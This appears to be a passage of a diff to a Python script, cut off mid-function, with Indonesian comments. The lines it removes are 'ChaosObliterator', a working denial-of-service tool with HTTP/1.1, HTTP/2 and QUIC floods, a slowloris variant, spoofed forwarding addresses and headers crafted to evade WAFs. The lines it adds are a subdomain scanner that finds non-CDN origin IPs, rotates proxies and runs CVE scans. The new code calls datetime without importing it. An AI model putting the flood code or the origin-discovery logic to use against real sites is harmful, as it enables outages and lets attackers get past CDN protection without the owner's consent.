@@ -1,294 +1,581 @@
-import threading
+import asyncio
+import aiohttp
+import aiodns
 import socket
-import http.client
-import ssl
-import random
-import string
-import time
+import ipaddress
 import argparse
 import logging
-import os
-import hashlib
-import xxhash
-import h2.connection
-import h2.events
-from typing import List
+import json
+import csv
+from pathlib import Path
+from typing import List, Tuple, Dict
+import random
+import string
+import subprocess
+import ssl
+import sys
+import requests
+from urllib.parse import urlencode
+from itertools import permutations
+import time
+from jinja2 import Environment, FileSystemLoader
+from collections import defaultdict
 
-# Logging Setup
+# Setup logging
 logging.basicConfig(
+    filename=f'bypass_results_{datetime.now().strftime("%Y%m%d_%H%M%S")}.log',
     level=logging.INFO,
-    format="%(asctime)s - [%(levelname)s] %(message)s",
-    handlers=[logging.FileHandler("chaos_obliterator.log"), logging.StreamHandler()]
+    format='%(asctime)s - %(levelname)s - %(message)s'
 )
 
-class ChaosObliterator:
-    def __init__(self, target_l7: str = None, target_l4: str = None, duration: int = 60, threads: int = 30, methods: List[str] = None):
-        self.target_l7 = target_l7.replace("https://", "").replace("http://", "").replace("www.", "").split("/")[0] if target_l7 else None
-        self.target_l4 = target_l4 if target_l4 else None
-        self.duration = duration
-        self.threads = min(threads, 60)  # Replit-optimized
-        self.methods = methods if methods else ["chaoshttp", "ghostloris", "udpchaos", "tcpobliterator"]
-        self.end_time = time.time() + duration
-        self.user_agents = [
-            f"Mozilla/5.0 (Windows NT {random.uniform(12.0, 18.0):.1f}; Win64; x64) AppleWebKit/537.{random.randint(80, 90)}",
-            f"curl/14.{random.randint(0, 9)}.{random.randint(0, 9)}",
-            f"HTTP-Client/12.{random.randint(0, 10)} (Rust/{random.randint(3, 4)}.{random.randint(0, 9)})",
-            f"Mozilla/5.0 (iPhone; CPU iPhone OS {random.randint(16, 20)}_0 like Mac OS X) Safari/605.1.{random.randint(40, 50)}"
+# Daftar rentang IP dan org name CDN
+CDN_IP_RANGES = {
+    "Cloudflare": ["173.245.48.0/20", "103.21.244.0/22", "104.16.0.0/13"],
+    "Akamai": ["23.32.0.0/11", "23.192.0.0/11"]
+}
+CDN_ORG_NAMES = {
+    "Cloudflare": ["CLOUDFLARE", "CLOUDFLARENET"],
+    "Akamai": ["AKAMAI", "AKAMAI TECHNOLOGIES"],
+    "Amazon": ["AMAZON", "AWS"]
+}
+CDN_HEADER_SIGNATURES = {
+    "Cloudflare": ["cf-ray", "cf-cache-status", "cf-chl-bypass"],
+    "Akamai": ["akamai-grn", "x-akamai-transformed"],
+    "Amazon": ["x-amz-cf-id", "x-amz-cf-pop"]
+}
+
+USER_AGENTS = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
+    "Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1"
+]
+HTTP_METHODS = ["GET", "HEAD", "OPTIONS"]
+RANDOM_SUBDOMAINS = [''.join(random.choices(string.ascii_lowercase + string.digits, k=15)) for _ in range(5)]
+
+def is_valid_domain(domain: str) -> bool:
+    import re
+    pattern = r'^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
+    return bool(re.match(pattern, domain))
+
+def is_private_ip(ip: str) -> bool:
+    try:
+        ip_addr = ipaddress.ip_address(ip)
+        return ip_addr.is_private
+    except ValueError:
+        return False
+
+def is_cdn_ip(ip: str, asn_info: Dict) -> Tuple[bool, str]:
+    try:
+        ip_addr = ipaddress.ip_address(ip)
+        for cdn, ranges in CDN_IP_RANGES.items():
+            for cidr in ranges:
+                if ip_addr in ipaddress.ip_network(cidr):
+                    return True, cdn
+        org = asn_info.get("org", "").upper()
+        for cdn, org_names in CDN_ORG_NAMES.items():
+            if any(name in org for name in org_names):
+                return True, cdn
+        return False, ""
+    except ValueError:
+        return False, ""
+
+async def detect_wildcard(domain: str, resolver: aiodns.DNSResolver) -> Tuple[bool, set]:
+    wildcard_ips = set()
+    for random_sub in RANDOM_SUBDOMAINS:
+        try:
+            result = await resolver.gethostbyname(f"{random_sub}.{domain}", socket.AF_INET)
+            wildcard_ips.update(result.addresses)
+        except:
+            continue
+    return bool(wildcard_ips), wildcard_ips
+
+async def get_passive_subdomains(domain: str, api_key: str = None) -> List[str]:
+    if not api_key:
+        logging.info("No SecurityTrails API key provided, skipping passive DNS")
+        return []
+    try:
+        headers = {"APIKEY": api_key}
+        response = requests.get(f"https://api.securitytrails.com/v1/domain/{domain}/subdomains", headers=headers)
+        if response.status_code == 200:
+            data = response.json()
+            return [f"{sub}.{domain}" for sub in data.get("subdomains", [])]
+        else:
+            logging.error(f"SecurityTrails API error: {response.status_code}")
+            return []
+    except Exception as e:
+        logging.error(f"Passive DNS lookup failed: {e}")
+        return []
+
+def generate_permutations(wordlist: List[str]) -> List[str]:
+    perms = set()
+    for word in wordlist[:1000]:
+        for perm in permutations(word.split("-"), r=2):
+            perms.add("-".join(perm))
+    return list(perms)
+
+async def resolve_dns(subdomain: str, resolver: aiodns.DNSResolver, semaphore: asyncio.Semaphore, record_types: List[str] = ["A", "AAAA", "CNAME", "MX"]) -> Dict:
+    async with semaphore:
+        results = {}
+        for rtype in record_types:
+            try:
+                if rtype == "MX":
+                    answers = await resolver.query(subdomain, rtype)
+                    results[rtype] = [str(ans.host) for ans in answers]
+                else:
+                    result = await resolver.gethostbyname(subdomain, socket.AF_INET if rtype == "A" else socket.AF_INET6 if rtype == "AAAA" else socket.AF_INET)
+                    results[rtype] = result.addresses
+            except Exception as e:
+                results[rtype] = []
+                logging.debug(f"Failed to resolve {subdomain} ({rtype}): {e}")
+        return results
+
+def lookup_asn(ip: str) -> Dict:
+    if is_private_ip(ip):
+        logging.info(f"Skipping ASN lookup for private IP: {ip}")
+        return {"asn": "-", "org": "Private IP", "country": "-"}
+    
+    try:
+        from ipwhois import IPWhois
+        obj = IPWhois(ip)
+        results = obj.lookup_rdap()
+        return {
+            "asn": results.get("asn", "-"),
+            "org": results.get("network", {}).get("name", "-"),
+            "country": results.get("network", {}).get("country", "-")
+        }
+    except ImportError:
+        logging.warning("ipwhois not installed, falling back to whois CLI")
+    except Exception as e:
+        logging.error(f"RDAP lookup failed for {ip}: {e}")
+    
+    try:
+        result = subprocess.run(
+            ["whois", ip],
+            capture_output=True,
+            text=True,
+            timeout=10
+        )
+        output = result.stdout.lower()
+        asn = org = country = "-"
+        for line in output.splitlines():
+            if "aut-num:" in line or "origin:" in line:
+                asn = line.split(":")[1].strip()
+            elif "org-name:" in line or "organization:" in line:
+                org = line.split(":")[1].strip()
+            elif "country:" in line:
+                country = line.split(":")[1].strip()
+        return {"asn": asn, "org": org, "country": country}
+    except Exception as e:
+        logging.error(f"Whois CLI lookup failed for {ip}: {e}")
+        return {"asn": "-", "org": "-", "country": "-"}
+
+def compute_ja3_fingerprint(context: ssl.SSLContext) -> str:
+    try:
+        ciphers = context.get_ciphers()
+        cipher_ids = [str(cipher["id"]) for cipher in ciphers]
+        return f"ja3:771,{'-'.join(cipher_ids[:3])},..."
+    except Exception as e:
+        logging.error(f"JA3 computation failed: {e}")
+        return "ja3:unknown"
+
+def get_random_headers() -> Dict:
+    return {
+        "User-Agent": random.choice(USER_AGENTS),
+        "Accept": random.choice([
+            "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+            "application/json, text/plain, */*"
+        ]),
+        "Accept-Language": random.choice(["en-US,en;q=0.5", "id-ID,id;q=0.9,en;q=0.8"]),
+        "Connection": "keep-alive",
+        "X-Forwarded-For": f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}",
+        "Cookie": f"session={''.join(random.choices(string.ascii_lowercase, k=10))}" if random.random() > 0.5 else ""
+    }
+
+def calculate_subdomain_score(result: Dict) -> int:
+    """Skor subdomain berdasarkan nilai: non-CDN, port terbuka, HTTP status"""
+    score = 0
+    if not result["cdn"]["is_cdn"]:
+        score += 50
+    if result.get("http", {}).get("status") == 200:
+        score += 30
+    if result.get("http", {}).get("port") in [80, 443]:
+        score += 20
+    if result.get("nuclei_findings"):
+        score += len(result["nuclei_findings"]) * 10
+    return score
+
+async def http_fingerprint(ip: str, port: int, session: aiohttp.ClientSession, use_tls_fingerprint: bool = False, proxy: str = None, rate_limiter: Dict = None) -> Dict:
+    url = f"http://{ip}:{port}" if port != 443 else f"https://{ip}"
+    if random.random() > 0.5:
+        url += "?" + urlencode({f"q{random.randint(1, 100)}": random.randint(1, 1000)})
+    
+    headers = get_random_headers()
+    method = random.choice(HTTP_METHODS)
+    result = {
+        "port": port,
+        "status": None,
+        "headers": {},
+        "title": "-",
+        "final_url": "-",
+        "tls_fingerprint": "-",
+        "http2": False,
+        "cdn_detected": "",
+        "cloudflare_bypass": False,
+        "tech_stack": []
+    }
+
+    try:
+        if rate_limiter and rate_limiter["last_429"] > time.time() - 60:
+            await asyncio.sleep(random.uniform(1, 3))
+        else:
+            await asyncio.sleep(random.uniform(0.1, 0.5))
+
+        if use_tls_fingerprint and port == 443:
+            context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
+            context.set_alpn_protocols(["h2", "http/1.1"])
+            context.set_ciphers("ECDHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-AES128-GCM-SHA256")
+            async with session.request(method, url, headers=headers, ssl=context, proxy=proxy, timeout=8) as resp:
+                result["status"] = resp.status
+                result["headers"] = dict(resp.headers)
+                result["final_url"] = str(resp.url)
+                result["http2"] = resp.version == (2, 0)
+                result["tls_fingerprint"] = compute_ja3_fingerprint(context)
+                if resp.status == 403 and "cloudflare" in str(resp.headers).lower():
+                    result["cloudflare_bypass"] = False
+                    logging.warning(f"Cloudflare WAF detected on {ip}:{port}")
+                elif resp.status == 429:
+                    rate_limiter["last_429"] = time.time()
+                    logging.warning(f"Rate limit hit on {ip}:{port}")
+                try:
+                    text = await resp.text()
+                    start = text.lower().find("<title>")
+                    end = text.lower().find("</title>")
+                    if start != -1 and end != -1:
+                        result["title"] = text[start + 7:end].strip()
+                    if "cloudflare" in text.lower() and "jschl" in text.lower():
+                        result["cloudflare_bypass"] = False
+                        logging.warning(f"Cloudflare JS challenge detected on {ip}:{port}")
+                except:
+                    pass
+                for cdn, signatures in CDN_HEADER_SIGNATURES.items():
+                    if any(sig in result["headers"] for sig in signatures):
+                        result["cdn_detected"] = cdn
+                        break
+        else:
+            async with session.request(method, url, headers=headers, proxy=proxy, timeout=8, allow_redirects=True) as resp:
+                result["status"] = resp.status
+                result["headers"] = dict(resp.headers)
+                result["final_url"] = str(resp.url)
+                result["http2"] = resp.version == (2, 0)
+                if resp.status == 403 and "cloudflare" in str(resp.headers).lower():
+                    result["cloudflare_bypass"] = False
+                    logging.warning(f"Cloudflare WAF detected on {ip}:{port}")
+                elif resp.status == 429:
+                    rate_limiter["last_429"] = time.time()
+                    logging.warning(f"Rate limit hit on {ip}:{port}")
+                try:
+                    text = await resp.text()
+                    start = text.lower().find("<title>")
+                    end = text.lower().find("</title>")
+                    if start != -1 and end != -1:
+                        result["title"] = text[start + 7:end].strip()
+                    if "cloudflare" in text.lower() and "jschl" in text.lower():
+                        result["cloudflare_bypass"] = False
+                        logging.warning(f"Cloudflare JS challenge detected on {ip}:{port}")
+                except:
+                    pass
+                for cdn, signatures in CDN_HEADER_SIGNATURES.items():
+                    if any(sig in result["headers"] for sig in signatures):
+                        result["cdn_detected"] = cdn
+                        break
+    except Exception as e:
+        logging.debug(f"HTTP check failed for {ip}:{port}: {e}")
+    return result
+
+def run_nuclei(ip: str, port: int, output_file: str) -> List[Dict]:
+    try:
+        cmd = [
+            "nuclei", "-u", f"http://{ip}:{port}" if port != 443 else f"https://{ip}",
+            "-t", "cves/", "-t", "technologies/", "-jsonl", "-o", output_file
         ]
-        self.success_count = {m: 0 for m in self.methods}
-        self.response_times = {m: [] for m in ["chaoshttp", "ghostloris"]}
-        self.lock = threading.Lock()
-        self.active_ports = [80, 443, 53, 123, 161, 389, 445, 1433, 1900, 5060, 11211, 1812, 5353, 3478, 6881, 17185, 27015, 4433]
-        self.jitter_factor = 1.0  # Adaptive jitter
+        result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
+        findings = []
+        with open(output_file, "r") as f:
+            for line in f:
+                findings.append(json.loads(line.strip()))
+        return findings
+    except Exception as e:
+        logging.error(f"Nuclei scan failed for {ip}:{port}: {e}")
+        return []
 
-    def _random_payload(self, size: int = 288) -> bytes:
-        """Chaos polymorphic payload with deca-entropy."""
-        seed = f"{random.randint(10000000000000000, 99999999999999999)}{time.time_ns()}{os.urandom(15).hex()}".encode()
-        hash1 = xxhash.xxh3_128(seed).digest()
-        hash2 = hashlib.sha3_512(hash1 + os.urandom(13)).digest()
-        hash3 = xxhash.xxh64(hash2 + os.urandom(11)).digest()
-        hash4 = hashlib.blake2b(hash3 + os.urandom(9), digest_size=32).digest()
-        hash5 = xxhash.xxh32(hash4 + os.urandom(7)).digest()
-        hash6 = hashlib.sha3_256(hash5 + os.urandom(6)).digest()
-        hash7 = xxhash.xxh3_64(hash6 + os.urandom(5)).digest()
-        hash8 = hashlib.blake2s(hash7 + os.urandom(4)).digest()
-        hash9 = xxhash.xxh3_128(hash8 + os.urandom(3)).digest()
-        hash10 = hashlib.sha3_224(hash9 + os.urandom(2)).digest()
-        return (hash10 + hash9 + hash8 + hash7 + hash6 + hash5 + hash4 + hash3 + hash2 + os.urandom(1))[:size]
+def load_proxies(proxy_file: str) -> List[str]:
+    if not Path(proxy_file).is_file():
+        logging.warning(f"Proxy file '{proxy_file}' tidak ditemukan")
+        return []
+    with open(proxy_file, "r") as f:
+        return [line.strip() for line in f if line.strip()]
 
-    def _random_path(self) -> str:
-        """Multiversal labyrinth URL paths for WAF obliteration."""
-        prefixes = ["v13", "chaos", "obliterator", "nexus", "vortex"]
-        segments = [''.join(random.choices(string.ascii_lowercase + string.digits, k=random.randint(45, 60))) for _ in range(random.randint(12, 15))]
-        query = f"?matrix={''.join(random.choices(string.hexdigits.lower(), k=52))}&epoch={random.randint(100000000000000, 999999999999999)}"
-        return f"/{random.choice(prefixes)}/{'/'.join(segments)}{query}"
+def generate_html_report(results: List[Dict], domain: str, output_file: str):
+    """Generate HTML dashboard pake Jinja2"""
+    env = Environment(loader=FileSystemLoader('.'))
+    template = env.from_string("""
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>Scan Report - {{ domain }}</title>
+        <style>
+            body { font-family: Arial, sans-serif; margin: 20px; }
+            table { border-collapse: collapse; width: 100%; }
+            th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
+            th { background-color: #f2f2f2; }
+            .high { background-color: #ffcccc; }
+            .medium { background-color: #ffffcc; }
+            .low { background-color: #ccffcc; }
+        </style>
+    </head>
+    <body>
+        <h1>Scan Report for {{ domain }}</h1>
+        <p>Generated: {{ timestamp }}</p>
+        <h2>Summary</h2>
+        <p>Total Subdomains: {{ total_subdomains }}</p>
+        <p>Non-CDN Subdomains: {{ non_cdn_count }}</p>
+        <p>Open Ports: {{ open_ports_count }}</p>
+        <h2>Results</h2>
+        <table>
+            <tr>
+                <th>Score</th>
+                <th>Subdomain</th>
+                <th>IP</th>
+                <th>ASN</th>
+                <th>Org</th>
+                <th>CDN</th>
+                <th>Port</th>
+                <th>Status</th>
+                <th>Title</th>
+                <th>HTTP/2</th>
+                <th>Tech Stack</th>
+            </tr>
+            {% for result in results %}
+            <tr class="{% if result.score >= 80 %}high{% elif result.score >= 50 %}medium{% else %}low{% endif %}">
+                <td>{{ result.score }}</td>
+                <td>{{ result.subdomain }}</td>
+                <td>{{ result.ip }}</td>
+                <td>{{ result.asn.asn }}</td>
+                <td>{{ result.asn.org }}</td>
+                <td>{{ result.cdn.name or "None" }}</td>
+                <td>{{ result.http.port if result.http else "-" }}</td>
+                <td>{{ result.http.status if result.http else "-" }}</td>
+                <td>{{ result.http.title if result.http else "-" }}</td>
+                <td>{{ "Yes" if result.http.http2 else "No" if result.http else "-" }}</td>
+                <td>{{ result.http.tech_stack | join(", ") if result.http else "-" }}</td>
+            </tr>
+            {% endfor %}
+        </table>
+    </body>
+    </html>
+    """)
+    
+    non_cdn_count = sum(1 for r in results if not r["cdn"]["is_cdn"])
+    open_ports_count = sum(1 for r in results if r.get("http", {}).get("status"))
+    rendered = template.render(
+        domain=domain,
+        timestamp=datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+        results=results,
+        total_subdomains=len(results),
+        non_cdn_count=non_cdn_count,
+        open_ports_count=open_ports_count
+    )
+    with open(output_file, "w") as f:
+        f.write(rendered)
 
-    def _random_ip(self) -> str:
-        """Spoofed IP with chaos entropy."""
-        return f"{random.randint(1, 223)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
+def save_results(results: List[Dict], json_file: str, csv_file: str, html_file: str, domain: str):
+    # Tambah skor dan tech stack
+    for result in results:
+        result["score"] = calculate_subdomain_score(result)
+        if result.get("nuclei_findings"):
+            result["http"]["tech_stack"] = [f["info"]["name"] for f in result["nuclei_findings"] if f["template-id"] == "tech-detect"]
+    
+    # Cluster IP berdasarkan ASN
+    asn_clusters = defaultdict(list)
+    for result in results:
+        asn = result["asn"]["asn"]
+        asn_clusters[asn].append(result["ip"])
+    
+    # Tambah summary ke JSON
+    summary = {
+        "total_subdomains": len(results),
+        "non_cdn_count": sum(1 for r in results if not r["cdn"]["is_cdn"]),
+        "open_ports_count": sum(1 for r in results if r.get("http", {}).get("status")),
+        "asn_clusters": {asn: list(set(ips)) for asn, ips in asn_clusters.items()}
+    }
+    
+    with open(json_file, "w") as f:
+        json.dump({"summary": summary, "results": results}, f, indent=2)
+    with open(csv_file, "w", newline="") as f:
+        writer = csv.DictWriter(f, fieldnames=[
+            "score", "subdomain", "ip", "asn", "org", "cdn_name", "port", "status",
+            "server", "title", "final_url", "http2", "tls_fingerprint", "cdn_detected", 
+            "cloudflare_bypass", "tech_stack", "nuclei_findings"
+        ])
+        writer.writeheader()
+        for result in results:
+            writer.writerow({
+                "score": result["score"],
+                "subdomain": result["subdomain"],
+                "ip": result["ip"],
+                "asn": result["asn"]["asn"],
+                "org": result["asn"]["org"],
+                "cdn_name": result["cdn"]["name"],
+                "port": result.get("http", {}).get("port", "-"),
+                "status": result.get("http", {}).get("status", "-"),
+                "server": result.get("http", {}).get("headers", {}).get("Server", "-"),
+                "title": result.get("http", {}).get("title", "-"),
+                "final_url": result.get("http", {}).get("final_url", "-"),
+                "http2": str(result.get("http", {}).get("http2", False)),
+                "tls_fingerprint": result.get("http", {}).get("tls_fingerprint", "-"),
+                "cdn_detected": result.get("http", {}).get("cdn_detected", "-"),
+                "cloudflare_bypass": str(result.get("http", {}).get("cloudflare_bypass", "-")),
+                "tech_stack": ",".join(result.get("http", {}).get("tech_stack", [])),
+                "nuclei_findings": json.dumps(result.get("nuclei_findings", []))
+            })
+    
+    generate_html_report(results, domain, html_file)
 
-    def _random_headers(self) -> dict:
-        """Transcendent WAF-evading headers."""
-        headers = {
-            "User-Agent": random.choice(self.user_agents),
-            "X-Forwarded-For": self._random_ip(),
-            "Accept": random.choice(["application/json", "text/event-stream", "*/*", "application/x-graphql"]),
-            "Cache-Control": "no-cache, no-store, must-revalidate",
-            "Connection": "keep-alive"
-        }
-        if random.random() < 0.9999:
-            headers["X-Nexus-ID"] = f"{random.randint(10000000000000000000, 99999999999999999999)}-{random.randint(100000000000, 999999999999)}"
-        if random.random() < 0.999:
-            headers["Accept-Language"] = random.choice(["en-ZA,en;q=0.05", "lt-LT", "uk-UA", "he-IL"])
-        if random.random() < 0.998:
-            headers["X-Vortex-Zone"] = random.choice(["vortex1", "vortex2", "chaos", "core"])
-        if random.random() < 0.997:
-            headers["X-Entropy-Nexus"] = ''.join(random.choices(string.hexdigits.lower(), k=60))
-        if random.random() < 0.996:
-            headers["X-Flow-Nexus"] = str(random.randint(1000000000000000, 9999999999999999))
-        if random.random() < 0.995:
-            headers["X-Signature-Vortex"] = ''.join(random.choices(string.hexdigits.lower(), k=36))
-        if random.random() < 0.994:
-            headers["X-Phase-Chaos"] = str(random.randint(-5000, 5000))
-        if random.random() < 0.993:
-            headers["X-Node-Matrix"] = ''.join(random.choices(string.hexdigits.lower(), k=28))
-        if random.random() < 0.992:
-            headers["X-Temporal-Vortex"] = str(random.randint(10000000, 99999999))
-        if random.random() < 0.991:
-            headers["X-Chaos-Field"] = ''.join(random.choices(string.hexdigits.lower(), k=20))
-        if random.random() < 0.99:
-            headers["X-Vector-Nexus"] = str(random.randint(1000, 9999))
-        return headers
+async def process_batch(subdomains: List[str], resolver: aiodns.DNSResolver, semaphore: asyncio.Semaphore, wildcard_ips: set) -> List[Dict]:
+    tasks = [resolve_dns(sub, resolver, semaphore) for sub in subdomains]
+    resolved = await asyncio.gather(*tasks, return_exceptions=True)
+    results = []
+    for sub, dns_records in zip(subdomains, resolved):
+        if isinstance(dns_records, Exception):
+            logging.error(f"DNS resolution failed for {sub}: {dns_records}")
+            continue
+        valid_records = {k: v for k, v in dns_records.items() if v}
+        if valid_records:
+            for ip in valid_records.get("A", []) + valid_records.get("AAAA", []):
+                if ip not in wildcard_ips:
+                    asn_info = lookup_asn(ip)
+                    is_cdn, cdn_name = is_cdn_ip(ip, asn_info)
+                    results.append({
+                        "subdomain": sub,
+                        "ip": ip,
+                        "dns_records": valid_records,
+                        "cdn": {"is_cdn": is_cdn, "name": cdn_name},
+                        "asn": asn_info
+                    })
+    return results
 
-    def _scan_ports(self):
-        """Dynamic port scanning for L4 targets."""
-        if not self.target_l4:
-            return
-        new_ports = []
-        for port in [80, 443, 8080, 3389, 1433, 3306, 1723, 445, 1812, 5353, 3478, 6881, 17185, 27015, 4433]:
+async def main(domain: str, wordlist_path: str, ports: str, use_tls_fingerprint: bool, use_nuclei: bool, securitytrails_api: str = None, proxy_file: str = None):
+    print("⚠️ PERINGATAN: Gunakan skrip ini hanya pada domain yang Anda miliki atau dengan izin eksplisit!")
+    logging.info(f"Starting scan for domain: {domain}")
+
+    if not is_valid_domain(domain):
+        print("Error: Domain tidak valid")
+        return
+
+    if not Path(wordlist_path).is_file():
+        print(f"Error: File wordlist '{wordlist_path}' tidak ditemukan")
+        return
+
+    target_ports = parse_ports(ports)
+    if not target_ports:
+        print("Error: Port tidak valid")
+        return
+
+    proxies = load_proxies(proxy_file) if proxy_file else []
+    if proxies:
+        logging.info(f"Loaded {len(proxies)} proxies")
+
+    with open(wordlist_path, "r") as f:
+        words = [line.strip() for line in f if line.strip()]
+    subdomains = [f"{w}.{domain}" for w in words]
+    if securitytrails_api:
+        passive_subdomains = await get_passive_subdomains(domain, securitytrails_api)
+        subdomains.extend(passive_subdomains)
+        logging.info(f"Added {len(passive_subdomains)} passive subdomains from SecurityTrails")
+    permuted_subdomains = [f"{p}.{domain}" for p in generate_permutations(words)]
+    subdomains.extend(permuted_subdomains)
+    subdomains = list(set(subdomains))
+    logging.info(f"Added {len(permuted_subdomains)} permuted subdomains")
+
+    resolver = aiodns.DNSResolver()
+    semaphore = asyncio.Semaphore(100)
+    rate_limiter = {"last_429": 0}
+    has_wildcard, wildcard_ips = await detect_wildcard(domain, resolver)
+    if has_wildcard:
+        print(f"Wildcard DNS detected for {domain}. IPs: {wildcard_ips}")
+        logging.info(f"Wildcard DNS detected: {wildcard_ips}")
+
+    batch_size = 1000
+    all_results = []
+    for i in range(0, len(subdomains), batch_size):
+        batch = subdomains[i:i + batch_size]
+        try:
+            batch_results = await process_batch(batch, resolver, semaphore, wildcard_ips)
+            all_results.extend(batch_results)
+            print(f"Processed {min(i + batch_size, len(subdomains))}/{len(subdomains)} subdomains")
+        except Exception as e:
+            logging.error(f"Batch processing failed: {e}")
+            continue
+
+    if not all_results:
+        print("Tidak ditemukan subdomain valid di luar wildcard/CDN")
+        logging.info("No valid subdomains found")
+        return
+
+    async with aiohttp.ClientSession() as session:
+        for result in all_results:
+            ip = result["ip"]
+            for port in target_ports:
+                proxy = random.choice(proxies) if proxies else None
+                try:
+                    http_result = await http_fingerprint(ip, port, session, use_tls_fingerprint, proxy, rate_limiter)
+                    if http_result["status"] and http_result["status"] not in [403, 429]:
+                        result["http"] = http_result
+                        if use_nuclei:
+                            nuclei_output = f"nuclei_{ip}_{port}.jsonl"
+                            result["nuclei_findings"] = run_nuclei(ip, port, nuclei_output)
+                        break
+                except Exception as e:
+                    logging.error(f"HTTP fingerprint failed for {ip}:{port}: {e}")
+                    continue
+
+    json_file = f"results_{domain}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
+    csv_file = f"results_{domain}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv"
+    html_file = f"results_{domain}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html"
+    save_results(all_results, json_file, csv_file, html_file, domain)
+    print(f"Results saved to {json_file}, {csv_file}, and {html_file}")
+    logging.info(f"Results saved to {json_file}, {csv_file}, and {html_file}")
+
+def parse_ports(port_str: str) -> List[int]:
+    ports = []
+    for part in port_str.split(','):
+        if '-' in part:
             try:
-                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                sock.settimeout(0.05)
-                sock.connect((self.target_l4, port))
-                new_ports.append(port)
-                sock.close()
-            except:
-                pass
-        if new_ports:
-            with self.lock:
-                self.active_ports = new_ports
-
-    def _adjust_jitter(self, response_time: float):
-        """Adaptive jitter based on response time."""
-        with self.lock:
-            if response_time > 100:
-                self.jitter_factor = min(self.jitter_factor * 1.2, 2.0)
-            elif response_time < 50:
-                self.jitter_factor = max(self.jitter_factor * 0.8, 0.5)
-
-    def _chaoshttp(self):
-        """L7: Chaos HTTP flood with HTTP/1.1, HTTP/2, and QUIC annihilation."""
-        if not self.target_l7:
-            return
-        while time.time() < self.end_time:
-            start_time = time.time()
+                start, end = map(int, part.split('-'))
+                ports.extend(range(start, end + 1))
+            except ValueError:
+                continue
+        else:
             try:
-                proto = random.random()
-                if proto < 0.5:  # HTTP/1.1
-                    conn = http.client.HTTPSConnection(self.target_l7, 443, timeout=0.015, context=ssl._create_unverified_context())
-                    headers = self._random_headers()
-                    method = random.choice(["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "HEAD", "TRACE", "CONNECT", "PROPFIND", "MKCOL", "LOCK"])
-                    path = self._random_path()
-                    body = self._random_payload(24) if method in ["POST", "PUT", "PATCH", "PROPFIND", "MKCOL", "LOCK"] else None
-                    conn.request(method, path, body=body, headers=headers)
-                    resp = conn.getresponse()
-                    self._adjust_jitter((time.time() - start_time) * 1000)
-                    with self.lock:
-                        self.success_count["chaoshttp"] += 1 if resp.status < 400 else 0
-                        self.response_times["chaoshttp"].append((time.time() - start_time) * 1000)
-                    conn.close()
-                elif proto < 0.8:  # HTTP/2
-                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                    sock.settimeout(0.015)
-                    sock.connect((self.target_l7, 443))
-                    context = ssl._create_unverified_context()
-                    sock = context.wrap_socket(sock, server_hostname=self.target_l7)
-                    h2conn = h2.connection.H2Connection()
-                    h2conn.initiate_connection()
-                    sock.sendall(h2conn.data_to_send())
-                    headers = {":method": "GET", ":authority": self.target_l7, ":scheme": "https", ":path": self._random_path()}
-                    headers.update(self._random_headers())
-                    h2conn.send_headers(1, headers, end_stream=True)
-                    sock.sendall(h2conn.data_to_send())
-                    self._adjust_jitter((time.time() - start_time) * 1000)
-                    with self.lock:
-                        self.success_count["chaoshttp"] += 1
-                        self.response_times["chaoshttp"].append((time.time() - start_time) * 1000)
-                    sock.close()
-                else:  # QUIC (HTTP/3)
-                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-                    sock.settimeout(0.015)
-                    payload = self._random_payload(128)
-                    sock.sendto(payload, (self.target_l7, 443))
-                    self._adjust_jitter((time.time() - start_time) * 1000)
-                    with self.lock:
-                        self.success_count["chaoshttp"] += 1
-                        self.response_times["chaoshttp"].append((time.time() - start_time) * 1000)
-                    sock.close()
-                time.sleep(random.uniform(0.0001, 0.0006) * self.jitter_factor)  # Adaptive chaos jitter
-            except:
-                pass
-
-    def _ghostloris(self):
-        """L7: Ghost Slowloris with yocto-drip and cipher vortex."""
-        if not self.target_l7:
-            return
-        while time.time() < self.end_time:
-            start_time = time.time()
-            try:
-                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                sock.settimeout(0.08)
-                sock.connect((self.target_l7, 443))
-                ciphers = random.choice([
-                    "TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-SHA256",
-                    "TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES256-GCM-SHA384",
-                    "TLS_AES_256_GCM_SHA384:ECDHE-RSA-CHACHA20-POLY1305",
-                    "TLS_AES_128_CCM_8_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256",
-                    "TLS_AES_128_CCM_SHA256:ECDHE-RSA-AES256-GCM-SHA384",
-                    "TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-CHACHA20-POLY1305",
-                    "TLS_AES_128_GCM_SHA256:ECDHE-ECDSA-CHACHA20-POLY1305",
-                    "TLS_AES_256_GCM_SHA384:ECDHE-RSA-AES256-SHA384"
-                ])
-                sock = ssl.wrap_socket(sock, ssl_version=ssl.PROTOCOL_TLSv1_3, ciphers=ciphers)
-                sock.send(f"GET {self._random_path()} HTTP/1.1\r\nHost: {self.target_l7}\r\n".encode())
